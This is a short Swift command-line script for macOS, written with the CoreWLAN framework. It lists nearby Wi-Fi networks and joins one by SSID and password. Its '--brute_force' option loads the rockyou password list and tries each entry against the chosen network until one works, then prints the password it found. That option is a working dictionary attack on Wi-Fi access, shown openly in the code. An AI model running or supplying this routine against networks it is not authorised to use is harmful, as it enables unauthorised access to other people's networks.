#!/usr/bin/swift
//  main.swift
//  wifi_script
//
//  Created by Maximilian Springenberg
//  Copyright © 2018 Maximilian Springenberg. All rights reserved.
import Foundation
import CoreWLAN


//overhead
//========

var pw : String?
var ssid : String?
var bf = false
var ls = false


//args parsing
//============

for arg in CommandLine.arguments[1..<CommandLine.arguments.endIndex] {
    
    // password
    if arg.starts(with: "--pw=") {
        pw = arg.split(separator: "=")[1...].joined(separator: "=")
        
    // listing networks
    } else if arg.starts(with: "--ls") {
        ls = true
        
    // ssid of network that ought to be connected to
    } else if arg.starts(with: "--ssid=") {
        ssid = arg.split(separator: "=")[1...].joined(separator: "=")
        
    // brute force approach if no password has been submitted
    } else if arg == "--brute_force" {
        bf = true;
    }
    
}


//performing connection and output
//================================

// listing networks
if ls, let scanner = NetworkScanner() {
    for network in scanner.networks {
        print("\(network.ssid!)")
        print("\(network)")
        print("\n")
    }
}

// ssid has to be valid for a connection
if ssid != nil, let scanner = NetworkScanner(), let network = scanner.getNetwork(withSSID: ssid!) {
    
    // connecting with passowrd
    if pw != nil {
        do {
            try scanner.currentInterface.associate(to: network, password: pw!)
        } catch let error as NSError {
            print("could not connect to \(ssid!)")
            print("ERROR: \(error.localizedDescription)")
        }
        
    // brute-force approach
    } else if bf {
        if let rockYou = TxtDataLoader(forResource: "rockyou"), let scanner = NetworkScanner(){
            
            // trying passwords from dictionary
            for pw in rockYou.lines {
                do {
                    try scanner.currentInterface.associate(to: network, password: String(pw))
                    // did not fail -> correct password
                    print("Connected to \(ssid!) with password \(pw)")
                    break
                } catch {
                    // failed -> wrong password
                }
            }
            
        }
    }
    
}
